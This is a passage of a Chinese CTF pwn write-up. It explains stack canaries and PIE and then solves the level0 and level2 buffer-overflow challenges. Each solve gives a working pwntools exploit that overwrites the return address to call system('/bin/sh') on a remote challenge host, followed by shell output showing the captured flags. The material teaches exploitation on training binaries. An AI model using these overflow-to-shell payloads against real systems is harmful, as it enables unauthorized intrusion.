<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...;开端</span><br><span class="line"></span><br><span class="line">.text:0000000000001192                 mov     ebx, 28h ; &#x27;(&#x27;			</span><br><span class="line">.text:0000000000001197                 mov     rax, fs:[rbx]			;fs段寄存器,偏移量28h处的一个四字搬进rax</span><br><span class="line">.text:000000000000119B                 mov     [rsp+18h+var_10], rax	;rax再搬进栈上var_10</span><br><span class="line"></span><br><span class="line">...;主要逻辑,中途rbx寄存器值不变</span><br><span class="line"></span><br><span class="line">.text:00000000000011B6                 mov     rax, [rsp+18h+var_10]	;栈上var_10搬出来给rax</span><br><span class="line">.text:00000000000011BB                 xor     rax, fs:[rbx]			;fs:[rbx]取出来和rax作比较</span><br><span class="line">.text:00000000000011BF                 jnz     short loc_11C7			;两者相同则说明var_10没有被修改过,否则溢出</span><br><span class="line"></span><br><span class="line">...尾声</span><br></pre></td></tr></table></figure>
<p><code>loc_11C7</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011C7 loc_11C7:                               ; CODE XREF: func+36↑j</span><br><span class="line">.text:00000000000011C7                 call    ___stack_chk_fail						;报告错误</span><br><span class="line">.text:00000000000011C7 ; &#125; // starts at 1189</span><br><span class="line">.text:00000000000011C7 func            endp</span><br><span class="line">.text:00000000000011C7</span><br></pre></td></tr></table></figure>
<p>下面我们用gdb调试器动态观察一下<code>.text:0000000000001197                 mov     rax, fs:[rbx]</code>发生后,rax中存放的是什么</p>
<p>首先使用<code>gcc main.c -O0 -S</code>得到<code>main.s</code>然后使用<code>gcc -g main.s -o main</code>得到<code>main</code></p>
<p>然后<code>gdb -tui -q main</code>对汇编代码进行调试</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511110203468.png"
alt="image-20220511110203468" />
<figcaption aria-hidden="true">image-20220511110203468</figcaption>
</figure>
<p>如果此时我们输入3个以上字符然后继续执行</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511110350341.png"
alt="image-20220511110350341" />
<figcaption aria-hidden="true">image-20220511110350341</figcaption>
</figure>
<p>再从栈中取出<code>-8(%rbp)</code>到rax中时,值已经被改变</p>
<p>异或运算之后打印eflag寄存器观察ZF标志位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eflags         0x206               [ PF IF ]</span><br></pre></td></tr></table></figure>
<p>发现ZF为0即刚才运算结果不为0,不会跳转<code>je .L3</code>,而是顺序执行<code>call  __stack_chk_fail@PLT</code></p>
<p>每次运行程序的时候<code>fs:28h</code>上的值都不同,即通过猜测金丝雀值进行绕过也是不太可能的</p>
<h4 id="pie">PIE</h4>
<blockquote>
<p>PIE全称是position-independent
executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题</p>
</blockquote>
<p>如果不使用PIE保护则每次进程的虚拟地址空间都是不变的</p>
<p>比如<code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,&amp;func);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开启PIE保护时</p>
<p>低12个二进制位不变但是高位会变</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# gcc  main.c -o main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x55eebe8f7139</span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x561135f2c139</span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x556dca0ef139</span><br></pre></td></tr></table></figure>
<p>不开启PIE保护时</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# gcc -fno-stack-protector -no-pie main.c -o main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x401126</span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/testPIE]</span><br><span class="line">└─# ./main</span><br><span class="line">0x401126</span><br></pre></td></tr></table></figure>
<p>func的地址就恒为<code>0x401126</code>不变了</p>
<h2 id="level0">001level0</h2>
<p>ret2text(return to text)返回.text节的函数</p>
<p>目的是getshell,</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwn/level0# checksec --file=level0</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE</span><br><span class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols     No       0               1       level0</span><br></pre></td></tr></table></figure>
<p>只有一个<code>NX</code>保护,没有金丝雀保护</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);			<span class="comment">//系统调用,向标准输出 输出&quot;Hello,World\n&quot;,最多输出0xD=13个字符</span></span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();					<span class="comment">//返回vulnerable_function的返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数就直接叫<code>vulnerable_function</code>生怕人家不知道他虚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF	//128字节的缓冲区</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);			<span class="comment">//系统调用,从标准输入获取至多0x200=512字节,写入buf缓冲区</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>read(0, buf, 0x200uLL);</code>可以获取比缓冲区大很多的输入,这里存在栈缓冲区溢出,那么怎么利用呢</p>
<p>如果使用ret2text的方法,只需要再在<code>.text</code>节找一个能够执行shell的函数,然后将其开始溢出到<code>vulnerable_function</code>函数的栈返回值位置</p>
<blockquote>
<p><code>vulnerable_function</code>的栈帧:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000080 buf             db 128 dup(?)</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>前128+8个字符无用,第136个字符开始的八个字节存放的是该函数的返回地址</p>
</blockquote>
<p>考虑ret2text方法,找一下有没有text节中可以调用shell的函数,可以通过ctrl+1然后观察Strings视图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511160139521.png"
alt="image-20220511160139521" />
<figcaption aria-hidden="true">image-20220511160139521</figcaption>
</figure>
<p>发现有这么一个<code>/bin/sh</code>也是shell的一种,双击观察</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511160213620.png"
alt="image-20220511160213620" />
<figcaption aria-hidden="true">image-20220511160213620</figcaption>
</figure>
<p>从交叉引用注释发现<code>'/bin/sh'</code>被callsystem函数调用,双击该交叉引用跳转到该函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400596 ; Attributes: bp-based frame	</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596                 public callsystem</span><br><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596 ; __unwind &#123;</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;	;/bin/sh作为参数压栈</span><br><span class="line">.text:000000000040059F                 call    _system				;调用system()函数,执行shell命令</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 ; &#125; // starts at 400596</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br></pre></td></tr></table></figure>
<p>该函数就干了一件事<code>system("/bin/sh")</code>,该函数起始地址<code>0x400596</code></p>
<p><del>可笑的是,主函数相关的调用链上并没有该函数,即该函数写了白写并且还能和栈缓冲区溢出一起成为内鬼</del></p>
<p>下面需要做到就是在<code>vulnerable_function</code>中read获取输入的时候将前136个字符乱写一气,然后接下来的八个字节写入<code>0x400596</code>,当<code>vulnerable_function</code>返回时,程序计数器PC获取其栈中保存的返回地址从<code>0x400596</code>即<code>callsystem</code>函数的起始位置开始执行,诚如是,则shell得矣</p>
<h3 id="exp">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接到111.200.241.244:58761</span></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;58761&#x27;</span>)		</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造负载,前0x88个字符随便写,不妨都写&#x27;a&#x27;,接下来八个字节要写0x00 40 05 96,而这显然不是ASCII码 可打印字符 能办到的</span></span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>).encode()+p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#向远程主机发送payload</span></span><br><span class="line">sh.sendline( payload )</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立交互式shell</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>p64函数干了啥?package 64位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0x400596</span>)</span><br><span class="line"><span class="string">b&#x27;\x96\x05@\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p>将参数按照小端模式转化成有8个字符的字符串,其中可打印的ascii字符比如@就直接用字符表示,否则用<code>\x XX</code>这种形式表示</p>
<p>p32函数会干啥?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0x400596</span>)</span><br><span class="line"><span class="string">b&#x27;\x96\x05@\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p>将参数按照小端模式转化成有4个字符的字符串,其中可打印的ascii字符比如@就直接用字符表示,否则用<code>\x XX</code>这种形式表示</p>
<p>本题使用<code>p32(0x400596)</code>是不可以的,因为如此打包则只会认为0x88之后只输入了4个字符,那么溢出会挤掉<code>vulnerable_function</code>函数一开始存放返回地址的低位前四个字节,不能保证后面高位四个字节都是0</p>
<p>而<code>p64(0x400596)</code>之后高四字节直接置0,保证返回到<code>callsystem</code>函数</p>
</blockquote>
<p>用kali或者ubuntu执行exp.py</p>
<p><code>python3 exp.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 111.200.241.244 on port 58761: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">level0</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ cat flag</span><br><span class="line">cyberpeace&#123;8efeda8a14caa49a15f88847757ca2d0&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<h2 id="level2">002level2</h2>
<p>本题需要非常熟悉x86-64汇编语言的函数调用过程,能够改变栈顶指针的指令,</p>
<blockquote>
<p>能够改变栈顶指针的指令有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">I.sub/add	显式改变栈顶指针esp</span><br><span class="line"></span><br><span class="line">II.push/pop	压栈退栈,以4字节为单元</span><br><span class="line"></span><br><span class="line">III.leave	函数最后释放自己局部变量的栈空间</span><br><span class="line"></span><br><span class="line">IV.call/retn	</span><br><span class="line">假设P中call Q 1.把P中call Q的下面一条指令压栈,2.Q-&gt;eip即设置程序计数器</span><br><span class="line">一定要注意,在改变程序计数器之前是有一个压栈保存返回地址的</span><br><span class="line"></span><br><span class="line">在刚进入Q函数时,栈顶还是指向返回地址的,</span><br><span class="line">然后对于_cdecl调用约定,会有esp压栈保存,</span><br><span class="line">然后才是Q函数的局部变量的栈空间</span><br><span class="line">而Q函数参数的栈空间是在P函数中分配的</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\level2&gt; checksec --file=level2</span><br><span class="line">[*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\level2\\level2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little				;32位程序</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>直接看反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>32位<code>_cdecl</code>调用约定下,传参不使用寄存器,只使用栈传参,</p>
<p>上述两点使得通过栈缓冲区溢出自己设置参数成为可能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>vulnerable_function</code>函数栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-00000088 buf             db 136 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>根据level0的思路,前140个字节胡乱输入,接下来4个字节写一个可以getshell的函数地址,下面就去找一个这样的函数</p>
<p>先看一下Strings里面有没有/bin/sh类似字样</p>
<p>确实找到一个,但是没有交叉引用,即没有任何函数使用它</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0804A024 hint            db &#x27;/bin/sh&#x27;,0</span><br></pre></td></tr></table></figure>
<p>如果想要获取shell,需要有<code>system('/bin/sh')</code>这种函数调用</p>
<p>因此需要在level0的思路上修改一下,构造一个<code>system('/bin/sh')</code>这种函数调用</p>
<p>上述函数调用,其汇编指令应为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push offset cmd		;cmd为&#x27;/bin/sh&#x27;的地址</span><br><span class="line">call system</span><br></pre></td></tr></table></figure>
<p><code>vulnerable_function</code>函数首先执行一个system函数然后执行read,然后返回</p>
<p>显然地址我们可以使用溢出修改成调用system函数的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0804845C                 call    _system</span><br></pre></td></tr></table></figure>
<p>在此之前,需要保证栈顶放好了<code>'/bin/sh'</code><strong>的地址</strong><code>.data:0804A024 hint            db '/bin/sh',0</code></p>
<p>那么需要精确的计算出栈顶此时的位置(esp栈顶指针与ebp帧指针的距离)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0804844B                 push    ebp</span><br><span class="line">.text:0804844C                 mov     ebp, esp								;esp=ebp=0,ebp在本函数中永远不会变化</span><br><span class="line">.text:0804844E                 sub     esp, 88h        ; buf				 ;esp=-0x88</span><br><span class="line">.text:08048454                 sub     esp, 0Ch								;esp=-0x94</span><br><span class="line">.text:08048457                 push    offset command  ; &quot;echo Input:&quot;		  ;esp=-0x98</span><br><span class="line">.text:0804845C                 call    _system								;esp=-0x98-&gt;-0x9C-&gt;-0x98</span><br><span class="line">.text:08048461                 add     esp, 10h								;esp=-0x88</span><br><span class="line">.text:08048464                 sub     esp, 4								;esp=-0x8C</span><br><span class="line">.text:08048467                 push    100h            ; nbytes				 ;esp=-0x90</span><br><span class="line">.text:0804846C                 lea     eax, [ebp+buf]							</span><br><span class="line">.text:08048472                 push    eax             ; buf				;esp=-0x94</span><br><span class="line">.text:08048473                 push    0               ; fd					;esp=-0x98</span><br><span class="line">.text:08048475                 call    _read								;esp=-0x98-&gt;-0x9C-&gt;-0x98</span><br><span class="line">.text:0804847A                 add     esp, 10h								;esp=-0x88</span><br><span class="line">.text:0804847D                 nop									</span><br><span class="line">.text:0804847E                 leave</span><br><span class="line">.text:0804847F                 retn											;从rbp+4位置退出</span><br></pre></td></tr></table></figure>
<p>在<code>vulnerable_function</code>执行<code>.text:0804847E                 leave</code>之前,栈顶指针相对于帧指针位于<code>-0x88</code>位置恰为buf的起始位置,然后<code>leave</code>的作用是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp																;esp=0</span><br><span class="line">pop ebp																	;esp=+4</span><br></pre></td></tr></table></figure>
<p>然后执行<code>retn</code>,相当于<code>pop eip</code>将本应该是正常返回的地址值交给程序计数器eip,然后程序跳转到该位置(system函数的地址)继续执行</p>
<p>考虑'/bin/sh'的地址作为system参数应该放在那里呢?</p>
<p>当eip中的指令被执行时,参数是此时的栈顶,即<code>esp=+8</code>的位置,这个位置不在<code>vulnerable_function</code>函数栈中,而是在他的调用者<code>main</code>中,但是eip修改之后从<code>vulnerable_function</code>不能返回到<code>main</code>,那么此时栈帧对于<code>main</code>函数来说就无意义了,此时的栈帧可以被任何函数利用</p>
<p>整个过程用表格表示为</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511210551512.png"
alt="image-20220511210551512" />
<figcaption aria-hidden="true">image-20220511210551512</figcaption>
</figure>
<p>综上,<code>esp∈[ebp-0x88,ebp+0x4)</code>共<code>0x8C</code>个字节随便写,然后<code>[ebp+0x4,ebp+0x8)</code>写system<strong>函数</strong>地址,<code>[ebp+0x8,ebp+0xC)</code>写system的<strong>参数</strong>地址</p>
<blockquote>
<p>ebp+x,x越大越靠近栈底,这里system在<code>[ebp+0x4,ebp+0x8)</code>,其参数在<code>[ebp+0x8,ebp+0xC)</code>,参数相对函数地址是更早的,即更靠近栈底的</p>
</blockquote>
<h3 id="exp-1">exp</h3>
<p>本地测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8C</span>).encode()+p32(<span class="number">0x0804845C</span>)+p32(<span class="number">0x0804A024</span>);</span><br><span class="line">		//前<span class="number">0x8C</span>随便写    + system地址     +参数地址</span><br><span class="line">sh.sendline( payload )</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level2]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./level2&#x27;</span>: pid 72                                                                                                   </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Input:</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">kali</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<p>连接靶机</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=process(&#x27;./level2&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;53153&#x27;</span>)		;连接到攻防世界靶机</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8C</span>).encode()+p32(<span class="number">0x0804845C</span>)+p32(<span class="number">0x0804A024</span>);</span><br><span class="line"></span><br><span class="line">sh.sendline( payload )</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level2]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 53153: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Input:</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">level2</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;37be55c2ba683c43f9410e5e7400e59d&#125;</span><br></pre></td></tr></table></figure>
<h2
id="guess_num栈缓冲区溢出改变随机数种子">003guess_num(栈缓冲区溢出改变随机数种子)</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\guess_num&gt; checksec guess_num</span><br><span class="line">[*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\guess_num\\guess_num&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="main">main()</h3>
